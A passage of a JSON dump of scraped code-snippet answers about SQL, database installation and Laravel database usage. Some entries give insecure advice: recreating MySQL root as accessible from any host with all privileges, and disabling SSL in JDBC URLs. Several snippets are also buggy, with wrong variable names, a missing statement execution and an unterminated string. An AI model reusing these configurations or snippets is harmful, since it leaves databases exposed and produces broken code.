    "description": "sudo apt update sudo apt install postgresql postgresql-contrib  sudo -u postgres createuser --interactive  sudo -u postgres createdb database1\nsudo apt update sudo apt install postgresql postgresql-contrib \nsudo apt-get install postgresql\nsudo apt install postgresql postgresql-contrib \napt-get install postgresql-12\nsudo -u postgres psql \n",
    "reg_date": "2021-10-12T09:56:26.000Z"
  },
  {
    "id": 1676,
    "keyword": null,
    "link": null,
    "title": " install postgresql ubuntu 20.04",
    "description": "please click on this link.  https://linuxhint.com/install_postgresql_-ubuntu/\n",
    "reg_date": "2021-10-12T09:56:26.000Z"
  },
  {
    "id": 1677,
    "keyword": null,
    "link": null,
    "title": " install sql server in ubuntu 20.04",
    "description": "sudo wget -qO- https://packages.microsoft.com/keys/microsoft.asc | sudo apt-key add -\n",
    "reg_date": "2021-10-12T09:56:26.000Z"
  },
  {
    "id": 1678,
    "keyword": null,
    "link": null,
    "title": " install sqlalchemy",
    "description": "pip install SQLAlchemy\npip install -U Flask-SQLAlchemy\n",
    "reg_date": "2021-10-12T09:56:26.000Z"
  },
  {
    "id": 1679,
    "keyword": null,
    "link": null,
    "title": " install sqlite3 python",
    "description": "import sqlite3 conn = sqlite3.connect('example.db') c = conn.cursor()  # Create table c.execute('''CREATE TABLE stocks              (date text, trans text, symbol text, qty real, price real)''')  # Insert a row of data c.execute(\"INSERT INTO stocks VALUES ('2006-01-05','BUY','RHAT',100,35.14)\")  # Save (commit) the changes conn.commit()  # We can also close the connection if we are done with it. # Just be sure any changes have been committed or they will be lost. conn.close()\npip install pysqlite3 \nimport sqlite3  # Create database conn = sqlite3.connect('tablename.db') c = conn.cursor() c.execute('''CREATE TABLE tablename(id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, number REAL)''') conn.commit() conn.close()  # Insert Values conn = sqlite3.connect('tablename.db') c = conn.cursor() c.execute(\"INSERT INTO tablename VALUES (?, ?)\", (name, number)) conn.commit() conn.close()  # Read Values conn = sqlite3.connect('tablename.db') c = conn.cursor()  for row in c.execute('SELECT * FROM tablename'): \tprint(row)  number = [row[2] for row in c.execute('SELECT * FROM tablename')] conn.close()\npip install db-sqlite3\npip install sqlite\nimport sqlite3 as lite  import sys    try:      con = lite.connect('products.db')      cur = con.cursor()          cur.execute(\"CREATE TABLE drinks(Id INTEGER PRIMARY KEY AUTOINCREMENT, Name TEXT, Price REAL)\")      cur.execute(\"CREATE TABLE fruits(Id INTEGER PRIMARY KEY AUTOINCREMENT, Name TEXT, Price REAL)\")      con.commit()                except e:      if con:          con.rollback()            print(\"Unexpected error %s:\" % e.args[0])      sys.exit(1)  finally:      if con:          con.close()  \n",
    "reg_date": "2021-10-12T09:56:26.000Z"
  },
  {
    "id": 1680,
    "keyword": null,
    "link": null,
    "title": " install sqlite driver ubuntu",
    "description": "sudo apt update sudo apt install sqlite3 sqlite3 --version sudo apt install sqlitebrowser \nsudo apt update sudo apt install sqlite3 sqlite3 --version sudo apt install sqlitebrowser\nsudo apt update sudo apt install sqlite3 # this will install sqlite sudo apt install squlitebrowser # its just like MySQL Workbench \n",
    "reg_date": "2021-10-12T09:56:26.000Z"
  },
  {
    "id": 1681,
    "keyword": null,
    "link": null,
    "title": " install sqlite npm",
    "description": "npm i sqlite3\n",
    "reg_date": "2021-10-12T09:56:26.000Z"
  },
  {
    "id": 1682,
    "keyword": null,
    "link": null,
    "title": " install squirrel sql ubuntu",
    "description": "sudo snap install squirrelsql\n",
    "reg_date": "2021-10-12T09:56:26.000Z"
  },
  {
    "id": 1683,
    "keyword": null,
    "link": null,
    "title": " installing mysql on centos 7",
    "description": "$ wget https://dev.mysql.com/get/mysql57-community-release-el7-11.noarch.rpm\nsudo yum localinstall https://dev.mysql.com/get/mysql80-community-release-el7-1.noarch.rpm\n",
    "reg_date": "2021-10-12T09:56:26.000Z"
  },
  {
    "id": 1684,
    "keyword": null,
    "link": null,
    "title": " installing mysql on ubuntu",
    "description": "sudo apt update sudo apt install mysql-server sudo service mysql start sudo mysql_secure_installation sudo mysql -u root   In mysql console: DROP USER 'root'@'localhost'; CREATE USER 'root'@'%' IDENTIFIED BY 'YOURPASSWORD'; GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' WITH GRANT OPTION; FLUSH PRIVILEGES;\nsudo apt update sudo apt install mysql-server sudo mysql_secure_installation\nsudo apt install mysql-server sudo mysql_secure_installation utility\nsudo apt-get update sudo apt-get install mysql-server \napt-get install mysql-client\nsystemctl status mysql\n",
    "reg_date": "2021-10-12T09:56:27.000Z"
  },
  {
    "id": 1685,
    "keyword": null,
    "link": null,
    "title": " instantiate a map with soql",
    "description": "Map<ID, Contact> m = new Map<ID, Contact>([SELECT Id, LastName FROM Contact]);\n",
    "reg_date": "2021-10-12T09:56:27.000Z"
  },
  {
    "id": 1686,
    "keyword": null,
    "link": null,
    "title": " intellij mysql set timezone",
    "description": "value=\"jdbc:mysql://localhost:3306/dbname?serverTimezone=UTC\"   in MYSQL do :(for french people, change the zone for u)   SET GLOBAL time_zone = 'Europe/Paris'; SET time_zone = 'Europe/Paris';   + see spring configuration :  https://www.baeldung.com/mysql-jdbc-timezone-spring-boot\n",
    "reg_date": "2021-10-12T09:56:27.000Z"
  },
  {
    "id": 1687,
    "keyword": null,
    "link": null,
    "title": " intersect sql",
    "description": "The SQL INTERSECT clause/operator is used to combine two SELECT statements, but returns rows only from the first SELECT statement  that are identical to a row in the second SELECT statement. This means INTERSECT returns only common rows returned by the two  SELECT statements.\nSELECT  ID, NAME, Amount, Date      FROM Customers      LEFT JOIN Orders      ON Customers.ID = Orders.Customer_id INTERSECT      SELECT  ID, NAME, Amount, Date      FROM Customers      RIGHT JOIN Orders      ON Customers.ID = Orders.Customer_id; \nINTERSECT: BASICALLY INTERSECT COMBINES COMMON ELEMENTS OF BOTH TABLES\nSELECT column1 [, column2 ] FROM table1 [, table2 ] [WHERE condition]  INTERSECT  SELECT column1 [, column2 ] FROM table1 [, table2 ] [WHERE condition]\n",
    "reg_date": "2021-10-12T09:56:27.000Z"
  },
  {
    "id": 1688,
    "keyword": null,
    "link": null,
    "title": " intersection in sql",
    "description": "SELECT  ID, NAME, Amount, Date      FROM Customers      LEFT JOIN Orders      ON Customers.ID = Orders.Customer_id INTERSECT      SELECT  ID, NAME, Amount, Date      FROM Customers      RIGHT JOIN Orders      ON Customers.ID = Orders.Customer_id; \n",
    "reg_date": "2021-10-12T09:56:27.000Z"
  },
  {
    "id": 1689,
    "keyword": null,
    "link": null,
    "title": " invalid column name sql",
    "description": "Whenever this happens to me, I press Ctrl+Shift+R which refreshes intellisense, close the query window (save if necessary), then start a new session which usually works quite well.\n",
    "reg_date": "2021-10-12T09:56:27.000Z"
  },
  {
    "id": 1690,
    "keyword": null,
    "link": null,
    "title": " invalid reference to FROM-clause entry for table \"unidades",
    "description": "remember to use the alias you used in from clause when using a column\n",
    "reg_date": "2021-10-12T09:56:27.000Z"
  },
  {
    "id": 1691,
    "keyword": null,
    "link": null,
    "title": " is between inclusive or exclusive sql",
    "description": "# The BETWEEN operator is inclusive # The expression: a BETWEEN b AND c # is really just shorthand, equivalent to this: ( a >= b AND a <= c )   # If that's not the condition you want,  # you can use different comparison operators: ( a > b AND a < c )\n/*the BETWEEN operator is used to filter the result set within  a certain range. the values can be numbers, texts or dates */ SELECT column_name(s) FROM table_name WHERE column_name BETWEEN value1 AND value2;\nSELECT column_name(s) FROM table_name WHERE column_name BETWEEN value1 AND value2;\n",
    "reg_date": "2021-10-12T09:56:27.000Z"
  },
  {
    "id": 1692,
    "keyword": null,
    "link": null,
    "title": " is not null postgresql",
    "description": "SELECT * FROM employees WHERE first_name IS NOT NULL;\n",
    "reg_date": "2021-10-12T09:56:27.000Z"
  },
  {
    "id": 1693,
    "keyword": null,
    "link": null,
    "title": " is not numeric sql",
    "description": "SELECT ISNUMERIC(250) AS Result; \n",
    "reg_date": "2021-10-12T09:56:27.000Z"
  },
  {
    "id": 1694,
    "keyword": null,
    "link": null,
    "title": " is not recognized built in function name",
    "description": "SELECT [dbo].[Split_On_Upper_Case] ('SaiBharath')\n",
    "reg_date": "2021-10-12T09:56:27.000Z"
  },
  {
    "id": 1695,
    "keyword": null,
    "link": null,
    "title": " is sql fast",
    "description": "Though SQL is a high-level domain language, it is very fast. As Travis Addair said, data organization (partitions, indexes), network (for short queries), and scale (number of machines, resources for each machine) bounds the performance of SQL. Still, SQL is fast because the database can decide how to get the data.\n",
    "reg_date": "2021-10-12T09:56:28.000Z"
  },
  {
    "id": 1696,
    "keyword": null,
    "link": null,
    "title": " is sqlite installed as part of python3",
    "description": "import sqlite3 conn = sqlite3.connect('example.db') c = conn.cursor()  # Create table c.execute('''CREATE TABLE stocks              (date text, trans text, symbol text, qty real, price real)''')  # Insert a row of data c.execute(\"INSERT INTO stocks VALUES ('2006-01-05','BUY','RHAT',100,35.14)\")  # Save (commit) the changes conn.commit()  # We can also close the connection if we are done with it. # Just be sure any changes have been committed or they will be lost. conn.close()\n",
    "reg_date": "2021-10-12T09:56:28.000Z"
  },
  {
    "id": 1697,
    "keyword": null,
    "link": null,
    "title": " is there any command to change postgres password",
    "description": "ALTER USER user_name WITH PASSWORD 'new_password'; \n",
    "reg_date": "2021-10-12T09:56:28.000Z"
  },
  {
    "id": 1698,
    "keyword": null,
    "link": null,
    "title": " isnull sql server",
    "description": "SELECT ISNULL(ValueToBeTested, ReturnValueIfNull);\n",
    "reg_date": "2021-10-12T09:56:28.000Z"
  },
  {
    "id": 1699,
    "keyword": null,
    "link": null,
    "title": " java.sql.SQLException: Unknown initial character set index '255' received from server. Initial client character set can be forced via the 'characterEncoding' property.",
    "description": "Please add ?characterEncoding=latin1 like this way \"jdbc:mysql://localhost/yourDB?characterEncoding=latin1\";\nadd after database name : database_name?characterEncoding=utf8\n",
    "reg_date": "2021-10-12T09:56:28.000Z"
  },
  {
    "id": 1700,
    "keyword": null,
    "link": null,
    "title": " java.sql.SQLNonTransientConnectionException: Public Key Retrieval is not allowed",
    "description": "jdbc:mysql://localhost:3306/db?allowPublicKeyRetrieval=true&useSSL=false \njdbc:mysql://localhost:3306/Database_dbName?allowPublicKeyRetrieval=true&useSSL=false; \nMYSQL DB CONNECTION ERROR\n",
    "reg_date": "2021-10-12T09:56:28.000Z"
  },
  {
    "id": 1701,
    "keyword": null,
    "link": null,
    "title": " java connect to mysql",
    "description": "import java.sql.*;   class MySqlConn{       public static void main(String args[]){           try{               Class.forName(\"com.mysql.cj.jdbc.Driver\");               Connection conn = DriverManager.getConnection(\"jdbc:mysql://             localhost:3306/databasename\",\"username\",\"password\");               Statement stmt = conn.createStatement();               ResultSet rs = stmt.executeQuery(\"select * from emp\");                 con.close();           }catch(Exception ex){             System.out.println(ex);         }       } }  \n",
    "reg_date": "2021-10-12T09:56:28.000Z"
  },
  {
    "id": 1702,
    "keyword": null,
    "link": null,
    "title": " java sql insert return id",
    "description": "Resultset result; PreparedStatement prep; String query = \"INSERT INTO myRel (data) VALUES (?)\";  prep = db.prepareStatement(query ,Statement.RETURN_GENERATED_KEYS);  result = prep.getGeneratedKeys();  if(result.next() && result != null){    System.out.println(\"Key: \" + result.getInt(1)); } else {    System.out.println(\"No, Nop nada\"); } \n",
    "reg_date": "2021-10-12T09:56:28.000Z"
  },
  {
    "id": 1703,
    "keyword": null,
    "link": null,
    "title": " javedkhan",
    "description": "sudo apt update sudo apt install mysql-server sudo mysql_secure_installation \n",
    "reg_date": "2021-10-12T09:56:28.000Z"
  },
  {
    "id": 1704,
    "keyword": null,
    "link": null,
    "title": " jdbc sql connection string",
    "description": "db_url      = jdbc:microsoft:sqlserver://HOST:1433;DatabaseName=DATABASE db_driver   = com.microsoft.jdbc.sqlserver.SQLServerDriver db_username = USERNAME db_password = PASSWORD \n",
    "reg_date": "2021-10-12T09:56:28.000Z"
  },
  {
    "id": 1705,
    "keyword": null,
    "link": null,
    "title": " job for mysql.service failed because the control process exited with error code. see \"systemctl status mysql.service\" and \"journalctl -xe\" for details.",
    "description": "mysqld_safe --defaults-file=/etc/my.cf  chown -R mysql:mysql /var/lib/mysql  /etc/init.d/mysqld start   /etc/init.d/mysqld stop  systemctl restart systemd-logind\n",
    "reg_date": "2021-10-12T09:56:29.000Z"
  },
  {
    "id": 1706,
    "keyword": null,
    "link": null,
    "title": " job oracle exemple",
    "description": "BEGIN     DBMS_SCHEDULER.CREATE_JOB(       job_name => '\"MYSCHEMA\".\"JOB_NAME\"',       job_type => 'STORED_PROCEDURE',       job_action => 'MYSCHEMA.PROCEDURE',       number_of_arguments => 0,       start_date => to_timestamp_tz(         '2021-04-08 14:19:32.000000000 EUROPE/PARIS',          'YYYY-MM-DD HH24:MI:SS.FF TZR'),       repeat_interval =>        'FREQ=DAILY;BYDAY=MON,TUE,WED,THU,FRI;BYHOUR=12;BYMINUTE=30;BYSECOND=0',       end_date => NULL,       enabled => FALSE,       auto_drop => FALSE,       comments => 'Job description');      DBMS_SCHEDULER.enable(             name => '\"MYSCHEMA\".\"JOB_NAME\"'); END;\n",
    "reg_date": "2021-10-12T09:56:29.000Z"
  },
  {
    "id": 1707,
    "keyword": null,
    "link": null,
    "title": " join first name and last name sql",
    "description": "SELECT CONCAT(first_name , ' ', last_name) as Name from TableName\n",
    "reg_date": "2021-10-12T09:56:29.000Z"
  },
  {
    "id": 1708,
    "keyword": null,
    "link": null,
    "title": " join in update query in mysql",
    "description": "You often use joins to query rows from a table that have (in the case of INNER JOIN) or may not have (in the case of LEFT JOIN) matching rows in another table. In MySQL, you can use the JOIN clauses in the UPDATE statement to perform the cross-table update.  The syntax of the MySQL UPDATE JOIN  is as follows:  UPDATE T1, T2, [INNER JOIN | LEFT JOIN] T1 ON T1.C1 = T2. C1 SET T1.C2 = T2.C2,      T2.C3 = expr WHERE condition Let&rsquo;s examine the MySQL UPDATE JOIN  syntax in greater detail:  First, specify the main table ( T1 ) and the table that you want the main table to join to ( T2 ) after the UPDATE clause. Notice that you must specify at least one table after the UPDATE  clause. The data in the table that is not specified after the UPDATE  clause will not be updated. Next, specify a kind of join you want to use i.e., either INNER JOIN  or LEFT JOIN  and a join predicate. The JOIN clause must appear right after the UPDATE clause. Then, assign new values to the columns in T1 and/or T2 tables that you want to update. After that, specify a condition in the WHERE clause to limit rows to rows for updating.\nUPDATE employees     LEFT JOIN     merits ON employees.performance = merits.performance  SET      salary = salary + salary * 0.015 WHERE     merits.percentage IS NULL;Code language: SQL (Structured Query Language) (sql)\n",
    "reg_date": "2021-10-12T09:56:29.000Z"
  },
  {
    "id": 1709,
    "keyword": null,
    "link": null,
    "title": " join multiple tables in sql",
    "description": "SELECT TableA.*, TableB.*, TableC.*, TableD.* FROM TableA     JOIN TableB         ON TableB.aID = TableA.aID     JOIN TableC         ON TableC.cID = TableB.cID     JOIN TableD         ON TableD.dID = TableA.dID WHERE DATE(TableC.date)=date(now())  \nSELECT Books_Namn, Author_Namn, Author_Age, Store_Namn FROM books  JOIN Author ON Author_Id = Author_Author_Id  JOIN Books_has_Store ON Books_Books_Id = Books_Id  JOIN Store ON Store_Id = Store_Store_Id;\nSELECT column-names   FROM table-name1 JOIN table-name2      ON column-name1 = column-name2  WHERE condition\nSELECT t1.ks, t1.[# Tasks], COALESCE(t2.[# Late], 0) AS [# Late] FROM      (SELECT ks, COUNT(*) AS '# Tasks' FROM Table GROUP BY ks) t1 LEFT JOIN     (SELECT ks, COUNT(*) AS '# Late' FROM Table WHERE Age > Palt GROUP BY ks) t2 ON (t1.ks = t2.ks); \n",
    "reg_date": "2021-10-12T09:56:29.000Z"
  },
  {
    "id": 1710,
    "keyword": null,
    "link": null,
    "title": " join multiple tables sql",
    "description": "SELECT TableA.*, TableB.*, TableC.*, TableD.* FROM TableA     JOIN TableB         ON TableB.aID = TableA.aID     JOIN TableC         ON TableC.cID = TableB.cID     JOIN TableD         ON TableD.dID = TableA.dID WHERE DATE(TableC.date)=date(now())  \nSELECT Books_Namn, Author_Namn, Author_Age, Store_Namn FROM books  JOIN Author ON Author_Id = Author_Author_Id  JOIN Books_has_Store ON Books_Books_Id = Books_Id  JOIN Store ON Store_Id = Store_Store_Id;\nSELECT t1.ks, t1.[# Tasks], COALESCE(t2.[# Late], 0) AS [# Late] FROM      (SELECT ks, COUNT(*) AS '# Tasks' FROM Table GROUP BY ks) t1 LEFT JOIN     (SELECT ks, COUNT(*) AS '# Late' FROM Table WHERE Age > Palt GROUP BY ks) t2 ON (t1.ks = t2.ks); \n",
    "reg_date": "2021-10-12T09:56:29.000Z"
  },
  {
    "id": 1711,
    "keyword": null,
    "link": null,
    "title": " join three tables sql",
    "description": "SELECT TableA.*, TableB.*, TableC.*, TableD.* FROM TableA     JOIN TableB         ON TableB.aID = TableA.aID     JOIN TableC         ON TableC.cID = TableB.cID     JOIN TableD         ON TableD.dID = TableA.dID WHERE DATE(TableC.date)=date(now())  \n-- LEFT OUTER JOIN is equivalent to LEFT JOIN -- b.VALUE1 is null when ID not in table2 (idem for c.VALUE1 in table3) SELECT a.ID, a.NAME, b.VALUE1, c.VALUE1 FROM table1 a    LEFT OUTER JOIN table2 b ON a.ID = b.ID   LEFT OUTER JOIN table3 c ON a.ID = c.ID WHERE a.ID >= 1000;  -- &dArr; Test it &dArr; (Fiddle source link)\n-- Rows with ID existing in both a, b and c -- JOIN is equivalent to INNER JOIN SELECT a.ID, a.NAME, b.VALUE1, c.VALUE1 FROM table1 a    JOIN table2 b ON a.ID = b.ID   JOIN table3 c ON a.ID = c.ID WHERE a.ID >= 1000; -- &dArr; Test it &dArr; (Fiddle source link)\nSELECT column-names   FROM table-name1 JOIN table-name2      ON column-name1 = column-name2  WHERE condition\nSuppose we are having three table named as  Student_details Attendance_details Batch_details And we have to apply join these three tables for fetching records  Example query: select column_names from Student_detail as s join Attendance_details as a on s.s_id = a.s_id join Batch_details as b on  s.s_id = b.s_id;  Here in the above example we implemented simple join but you change it with own join requirements.\n",
    "reg_date": "2021-10-12T09:56:29.000Z"
  },
  {
    "id": 1712,
    "keyword": null,
    "link": null,
    "title": " join to find results not in another table",
    "description": "SELECT t1.name FROM table1 t1 LEFT JOIN table2 t2 ON t2.name = t1.name WHERE t2.name IS NULL\n",
    "reg_date": "2021-10-12T09:56:29.000Z"
  },
  {
    "id": 1713,
    "keyword": null,
    "link": null,
    "title": " join vs inner join",
    "description": "They are functionally equivalent, but INNER JOIN can be  a bit clearer to read, especially if the query has  other join types (i.e. LEFT or RIGHT or CROSS)  included in it.\n-- Rows with ID existing in both a and b -- JOIN is equivalent to INNER JOIN SELECT a.ID, a.NAME, b.VALUE1 FROM table1 a    JOIN table2 b ON a.ID = b.ID WHERE a.ID >= 1000; -- &dArr; Test it &dArr; (Fiddle source link)\nINNER JOIN: is used when retrieving data from multiple tables and will return only matching data.   FULL OUTER JOIN: is used when retrieving data from multiple tables and will return both table records, matching and non-matching.\nINNER JOIN: is used when retrieving data from multiple tables and will return only matching data.  LEFT OUTER JOIN: is used when retrieving data from multiple tables and will return left table and any matching right table records.  RIGHT OUTER JOIN: is used when retrieving data from multiple tables and will return right table and any matching left table records  FULL OUTER JOIN: is used when retrieving data from multiple tables and will return both table records, matching and non-matching.\n",
    "reg_date": "2021-10-12T09:56:29.000Z"
  },
  {
    "id": 1714,
    "keyword": null,
    "link": null,
    "title": " joins in sql",
    "description": "JOINING 2 Tables in sql  SELECT X.Column_Name , Y.Column_Name2 FROM TABLES1_NAME X  INNER JOIN TABLES2_NAME Y ON X.Primary_key = Y.Foreign_key;   --FOR EXAMPLE --GET THE FIRST_NAME AND JOB_TITLE --USE EMPLOYEES AND JOBS TABLE --THE RELATIONSHIP IS JOB_ID  SELECT E.FIRST_NAME , J.JOB_TITLE FROM EMPLOYEES E INNER JOIN JOBS J ON J.JOB_ID = E.JOB_ID;  \nSELECT Orders.OrderID, Customers.CustomerName, Orders.OrderDate FROM Orders INNER JOIN Customers ON Orders.CustomerID=Customers.CustomerID;\nINNER JOIN: is used when retrieving data from multiple tables and will return only matching data.  LEFT OUTER JOIN: is used when retrieving data from multiple tables and will return left table and any matching right table records.  RIGHT OUTER JOIN: is used when retrieving data from multiple tables and will return right table and any matching left table records  FULL OUTER JOIN: is used when retrieving data from multiple tables and will return both table records, matching and non-matching.    INNER JOIN : SELECT select_list From TableA A Inner Join TableB B On A.Key = B.Key   LEFT OUTER JOIN : SELECT select_list From TableA A Left Join TableB B On A.Key = B.Key  (where b.key is null)//For delete matching data    RIGTH OUTER JOIN : SELECT select_list From TableA A Right Join TableB B On A.Key = B.Key   FULL JOIN : SELECT select_list From TableA A FULL OUTER Join TableB B On A.Key = B.Key  \n-- Rows with ID existing in both a, b and c -- JOIN is equivalent to INNER JOIN SELECT a.ID, a.NAME, b.VALUE1, c.VALUE1 FROM table1 a    JOIN table2 b ON a.ID = b.ID   JOIN table3 c ON a.ID = c.ID WHERE a.ID >= 1000; -- &dArr; Test it &dArr; (Fiddle source link)\nSuppose we are having three table named as  Student_details Attendance_details Batch_details And we have to apply join these three tables for fetching records  Example query: select column_names from Student_detail as s join Attendance_details as a on s.s_id = a.s_id join Batch_details as b on  s.s_id = b.s_id;  Here in the above example we implemented simple join but you change it with own join requirements.\nINNER JOIN: is used when retrieving data from multiple tables and will return only matching data.  LEFT OUTER JOIN: is used when retrieving data from multiple tables and will return left table and any matching right table records.  RIGHT OUTER JOIN: is used when retrieving data from multiple tables and will return right table and any matching left table records  FULL OUTER JOIN: is used when retrieving data from multiple tables and will return both table records, matching and non-matching.\n",
    "reg_date": "2021-10-12T09:56:29.000Z"
  },
  {
    "id": 1715,
    "keyword": null,
    "link": null,
    "title": " joins in sql server",
    "description": "/*General Formula For Joins*/ SELECT Column_List FROM Left_Table_Name JOIN_TYPES Right_Table_Name ON Join_Condition  /*INNER JOIN - Matching Rows + Non Matching Rows are Eliminated   LEFT JOIN - Matching Rows + Non Matching Rows from the Left table   RIGHT JOIN - Matching Rows + Non Matching Rows from the Right table   FULL JOIN - Matching Rows + Non Matching Rows from the Both  tables   CROSS JOIN - Return cartesian product of the tables involved in the Join   SELF JOIN - Return each table row is combined with itself and with every other table row.   The SELF JOIN can be thought of as a JOIN of two copies of the same tables.*/    /*Cross Join*/ SELECT Column_List FROM Left_Table_Name CROSS JOIN Right_Table_Name\nSELECT Orders.OrderID, Customers.CustomerName, Orders.OrderDate FROM Orders INNER JOIN Customers ON Orders.CustomerID=Customers.CustomerID;\nCREATE PROCEDURE SP_Purechase_Selecte  AS  SELECT p.P_Id , p.p_name, p.alias_name, p.alias_code, p.p_name_inlocal_language, p.barcode, p.buy_price, p.sell_price_tak, p.sell_price_ko, p.qty, typeQty.qty_type, b.brand_name, CA.cat_name , SN.sn_name ,  P.P_Description , p.Barwari_Krin    FROM tbl_Purchase p   INNER JOIN tbl_Qty_Type typeQty ON P.qty_type_id=typeQty.id  INNER JOIN tbl_Brand b ON p.brand_id=b.brand_id  INNER JOIN tbl_Catigory CA ON P.cat_id =CA.cat_id  INNER JOIN tbl_Sceintific_Name SN ON p.sn_id= SN.sn_id  INNER JOIN tbl_Product_Creation  GROUP BY P.P_Id,  CA.Cat_Name , P.P_Name , SN .Sn_Name , P.sellPrice , P.buyPrice , P.Barcode ,  P.Qty , P.P_Description, p.Barwari_Krin  RETURN\n",
    "reg_date": "2021-10-12T09:56:29.000Z"
  },
  {
    "id": 1716,
    "keyword": null,
    "link": null,
    "title": " joomla execute raw sql",
    "description": "$db = JFactory::getDbo(); $sql = \"UPDATE TableB SET TableB.value = (SELECT TableA.value FROM TableA WHERE TableA.name = TableB.name); $db->setQuery($sql); $db->execute(); $result = $db->loadObjectList(); print_r($result);\n",
    "reg_date": "2021-10-12T09:56:30.000Z"
  },
  {
    "id": 1717,
    "keyword": null,
    "link": null,
    "title": " jooq convert using gbk",
    "description": "DSL.field(\"convert({0} USING gbk)\", tb.NAME);\n",
    "reg_date": "2021-10-12T09:56:30.000Z"
  },
  {
    "id": 1718,
    "keyword": null,
    "link": null,
    "title": " json in sql server",
    "description": "SELECT name, surname   FROM emp   FOR JSON AUTO;\n",
    "reg_date": "2021-10-12T09:56:30.000Z"
  },
  {
    "id": 1719,
    "keyword": null,
    "link": null,
    "title": " jsonvalue sql",
    "description": "JSON_VALUE(jsonInfo,'$.info.address[0].town')\n",
    "reg_date": "2021-10-12T09:56:30.000Z"
  },
  {
    "id": 1720,
    "keyword": null,
    "link": null,
    "title": " just installed mysql password",
    "description": "$ sudo cat /etc/mysql/debian.cnf Note the lines which read:  user     = debian-sys-maint password = blahblahblah Then:  $ mysql -u debian-sys-maint -p Enter password: // type 'blahblahblah', ie. password from debian.cnf  mysql> USE mysql mysql> SELECT User, Host, plugin FROM mysql.user; +------------------+-----------+-----------------------+ | User             | Host      | plugin                | +------------------+-----------+-----------------------+ | root             | localhost | auth_socket           | | mysql.session    | localhost | mysql_native_password | | mysql.sys        | localhost | mysql_native_password | | debian-sys-maint | localhost | mysql_native_password | +------------------+-----------+-----------------------+ 4 rows in set (0.00 sec)  mysql> UPDATE user SET plugin='mysql_native_password' WHERE User='root'; mysql> COMMIT;  // When you don't have auto-commit switched on Either:  mysql> ALTER USER 'root'@'localhost' IDENTIFIED BY 'new_password'; Or:  // For MySQL 5.7+ UPDATE mysql.user SET authentication_string=PASSWORD('new_password') where user='root'; Then:  mysql> FLUSH PRIVILEGES; mysql> COMMIT;  // When you don't have auto-commit switched on mysql> EXIT  $ sudo service mysql restart $ mysql -u root -p Enter password: // Yay! 'new_password' now works!\n",
    "reg_date": "2021-10-12T09:56:30.000Z"
  },
  {
    "id": 1721,
    "keyword": null,
    "link": null,
    "title": " jwt laravel",
    "description": "composer require tymon/jwt-auth \nphp artisan jwt:secret\n    $ composer require tymon/jwt-auth:dev-develop --prefer-source \nphp artisan jwt:secret \nphp artisan vendor:publish --provider=\"Tymon\\JWTAuth\\Providers\\LaravelServiceProvider\" \n'providers' => [      ...      Tymon\\JWTAuth\\Providers\\LaravelServiceProvider::class, ] \n",
    "reg_date": "2021-10-12T09:56:30.000Z"
  },
  {
    "id": 1722,
    "keyword": null,
    "link": null,
    "title": " key validation sql",
    "description": "SELECT   constraint_name, table_name, column_name FROM   information_schema.key_column_usage WHERE   table_name = ' ';\n",
    "reg_date": "2021-10-12T09:56:30.000Z"
  },
  {
    "id": 1723,
    "keyword": null,
    "link": null,
    "title": " kill a pid redshift",
    "description": "select * from pg_terminate_backend( pid )\n",
    "reg_date": "2021-10-12T09:56:30.000Z"
  },
  {
    "id": 1724,
    "keyword": null,
    "link": null,
    "title": " kill mysql processlist in whose time more than 200",
    "description": "mysql> select group_concat(concat('KILL ',id,';')) from  information_schema.processlist where user='root' and time > 500;  mysql> source /tmp/a.txt;\n",
    "reg_date": "2021-10-12T09:56:30.000Z"
  },
  {
    "id": 1725,
    "keyword": null,
    "link": null,
    "title": " laravel  SQLSTATE[HY000] [2002] No such file or directory (SQL: select * from information schema.tables where table schema = testDB and table name = migrations and table type = 'BASE TABLE')",
    "description": "'unix_socket' => env('DB_SOCKET', '/Applications/MAMP/tmp/mysql/mysql.sock'), \n",
    "reg_date": "2021-10-12T09:56:30.000Z"
  },
  {
    "id": 1726,
    "keyword": null,
    "link": null,
    "title": " laravel database Using Named Bindings",
    "description": "$results = DB::select('select * from users where id = :id', ['id' => 1]);\n",
    "reg_date": "2021-10-12T09:56:30.000Z"
  },
  {
    "id": 1727,
    "keyword": null,
    "link": null,
    "title": " laravel db facade",
    "description": "use Illuminate\\Support\\Facades\\DB;  DB::transaction(function () {     DB::update('update users set votes = 1');      DB::delete('delete from posts'); });\nuse Illuminate\\Support\\Facades\\DB;  $users = DB::select('select * from users');  foreach ($users as $user) {     echo $user->name; }\nDB::beginTransaction();  try {     DB::insert(...);         DB::commit(); } catch (\\Throwable $e) {     DB::rollback();     throw $e; }\n$results = DB::select('select * from users where id = :id', ['id' => 1]);\n$antiques = DB::table('antiques')     ->join('images', 'images.antiques_id', '=', 'antiques.id')     ->latest()     ->limit(20)     ->get(['antiques.*', 'images.path']); \n",
    "reg_date": "2021-10-12T09:56:31.000Z"
  },
  {
    "id": 1728,
    "keyword": null,
    "link": null,
    "title": " laravel db transaction",
    "description": "DB::beginTransaction();  try {     DB::insert(...);     DB::insert(...);     DB::insert(...);      DB::commit();     // all good } catch (\\Exception $e) {     DB::rollback();     // something went wrong }\nuse Illuminate\\Support\\Facades\\DB;  DB::transaction(function () {     DB::update('update users set votes = 1');      DB::delete('delete from posts'); });\n// try...catch try {     // Transaction     $exception = DB::transaction(function() {          // Do your SQL here      });      if(is_null($exception)) {         return true;     } else {         throw new Exception;     }  } catch(Exception $e) {     return false; } \nDB::beginTransaction();  try {     DB::insert(...);         DB::commit(); } catch (\\Throwable $e) {     DB::rollback();     throw $e; }\nDB::beginTransaction(); try { /** Statement */   DB::commit(); }  catch (\\Exception $e) { /** Statement if failed */ DB::rollback(); }\nDB::beginTransaction();  try {     DB::insert(...);         DB::commit(); } catch (\\Exception $e) {     DB::rollback();     throw $e; } catch (\\Throwable $e) {     DB::rollback();     throw $e; } \n",
    "reg_date": "2021-10-12T09:56:31.000Z"
  },
  {
    "id": 1729,
    "keyword": null,
    "link": null,
    "title": " laravel general error 2006 mysql server has gone away",
    "description": "[mysqld] max_allowed_packet=16M \n",
    "reg_date": "2021-10-12T09:56:31.000Z"
  },
  {
    "id": 1730,
    "keyword": null,
    "link": null,
    "title": " laravel get sql query eloquent with parameters",
    "description": "$name = $request->query('name', 'Helen');\n$query->toSql();  $query->getBindings() \n",
    "reg_date": "2021-10-12T09:56:31.000Z"
  },
  {
    "id": 1731,
    "keyword": null,
    "link": null,
    "title": " laravel jwt",
